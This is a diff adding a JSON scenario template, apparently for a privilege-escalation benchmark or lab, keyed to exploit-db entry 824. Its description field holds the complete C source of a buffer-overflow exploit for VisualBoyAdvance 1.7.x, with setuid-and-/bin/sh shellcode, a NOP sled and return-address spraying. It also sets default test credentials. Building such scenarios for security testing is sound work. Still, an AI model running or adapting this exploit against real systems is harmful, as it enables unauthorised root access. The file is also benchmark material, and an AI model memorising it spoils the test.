@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_824",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: VisualBoyAdvanced 1.7.x - Non SUID Local Shell (OSVDB-19484)\n\nExploit source code (824.c):\n```\n/*\nVisualBoyAdvanced 1.7.x BufferOver Flow exploit\nVBA - WEBSITE : vba.ngemu.com\nFound & coded by Qnix - Qnix[at]bsdmail[dot]org\n*/\n\n#include <stdlib.h>\n\nchar shellcode[] =\n       \"\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\" /* setuid() */\n       \"\\xeb\\x5a\\x5e\\x31\\xc0\\x88\\x46\\x07\\x31\\xc0\\x31\\xdb\\xb0\\x27\\xcd\"\n       \"\\x80\\x85\\xc0\\x78\\x32\\x31\\xc0\\x31\\xdb\\x66\\xb8\\x10\\x01\\xcd\\x80\"\n       \"\\x85\\xc0\\x75\\x0f\\x31\\xc0\\x31\\xdb\\x50\\x8d\\x5e\\x05\\x53\\x56\\xb0\"\n       \"\\x3b\\x50\\xcd\\x80\\x31\\xc0\\x8d\\x1e\\x89\\x5e\\x08\\x89\\x46\\x0c\\x50\"\n       \"\\x8d\\x4e\\x08\\x51\\x56\\xb0\\x3b\\x50\\xcd\\x80\\x31\\xc0\\x8d\\x1e\\x89\"\n       \"\\x5e\\x08\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\"\n       \"\\xcd\\x80\\xe8\\xa1\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\";\n\n\nunsigned long sp(void)\n{ __asm__(\"movl %esp, %eax\");}\n\nint main(int argc, char *argv[])\n{\n  int i, offset;\n  long esp, ret, *addr_ptr;\n  char *buffer, *ptr;\n\n  offset = 0;\n  esp = sp();\n  ret = esp - offset;\n\nif (argc >= 2) {\nprintf(\"\\n ************************************************ \\n\");\nprintf(\" VisualBoyAdvanced 1.7.x BufferOver Flow exploit \\n\");\nprintf(\"            by Qnix[at]bsdmail[dot]org      \");\nprintf(\"\\n ************************************************ \\n\\n\");\nprintf(\"[~] Stack pointer (ESP) : 0x%x\\n\", esp);\nprintf(\"[~] Offset from ESP     : 0x%x\\n\", offset);\nprintf(\"[~] Desired Return Addr : 0x%x\\n\\n\", ret);\n} else {\nprintf(\"\\n ************************************************ \\n\");\nprintf(\" VisualBoyAdvanced 1.7.x BufferOver Flow Exploit \\n\");\nprintf(\"            by Qnix[at]bsdmail[dot]org      \");\nprintf(\"\\n ************************************************ \\n\\n\");\nprintf(\"useage : ./vba-exp <VisualBoyAdvanced File> \\n\\n\");\n}\n\nbuffer = malloc(2300);\n\nptr = buffer;\naddr_ptr = (long *) ptr;\nfor(i=0; i < 2300; i+=4)\n{ *(addr_ptr++) = ret; }\n\nfor(i=0; i < 1900; i++)\n{ buffer[i] = '\\x90'; }\n\nptr = buffer + 1900;\nfor(i=0; i < strlen(shellcode); i++)\n{ *(ptr++) = shellcode[i]; }\n\nbuffer[2300-1] = 0;\n\nexecl(argv[1],\"VisualBoyAdvance\",buffer,0);\n\nfree(buffer);\n\n  return 0;\n}\n\n// milw0rm.com [2005-09-13]\n```",
+  "cve": "OSVDB-19484",
+  "exploitdb_id": "824",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_824",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
